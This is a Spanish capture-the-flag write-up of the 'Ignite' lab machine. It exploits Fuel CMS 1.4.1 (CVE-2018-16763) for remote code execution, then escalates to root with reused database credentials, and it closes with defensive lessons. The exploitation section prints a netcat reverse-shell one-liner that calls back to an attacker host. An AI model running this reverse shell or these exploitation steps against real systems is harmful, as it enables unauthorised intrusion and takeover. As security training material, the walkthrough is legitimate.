Ignite

Máquina que corre Fuel CMS 1.4.1, vulnerable a Remote Code Execution (CVE-2018-16763). Explotamos el CMS para obtener shell y escalamos usando credenciales en un archivo de configuración.

2025 ~45 min cat4clysm
Herramientas utilizadas
nmap gobuster burp suite python exploit netcat

Reconocimiento

Escaneo inicial para detectar puertos y servicios.

root@kali:~$ 
nmap -sV -sC -oN ignite.nmap <TARGET_IP>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18
| http-title: Welcome to Fuel CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)

Solo el puerto 80 abierto. Al visitar la web encontramos Fuel CMS 1.4.1 con las credenciales por defecto visibles en la página de inicio: admin / admin.

CVE-2018-16763 — Fuel CMS 1.4.1 permite RCE no autenticado a través del parámetro fuel/pages/select/?filter=.

Explotación

Usamos un exploit público en Python para obtener una reverse shell.

root@kali:~$ 
python3 exploit.py -u http://<TARGET_IP>

Desde la consola del exploit, lanzamos una reverse shell:

cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
root@kali:~$ 
nc -lvnp 4444

listening on [any] 4444 ...
connect to [LHOST] from (UNKNOWN) [TARGET] 49876
$ whoami
www-data

Escalada de privilegios

Buscamos credenciales en los archivos de configuración de Fuel CMS.

cat /var/www/html/fuel/application/config/database.php
'username' => 'root',
'password' => 'mememe',

Probamos la contraseña con el usuario root del sistema:

su root
Password: mememe

whoami
root

Flags

user.txt cat /home/www-data/flag.txt
Flag obtenida
root.txt cat /root/root.txt
Flag obtenida

Lecciones aprendidas

  • Nunca dejar credenciales por defecto en producción — admin/admin es lo primero que se prueba.
  • Los archivos de configuración de CMS frecuentemente contienen credenciales reutilizables.
  • CVE-2018-16763 es un RCE crítico que afecta Fuel CMS 1.4.1 y versiones anteriores.
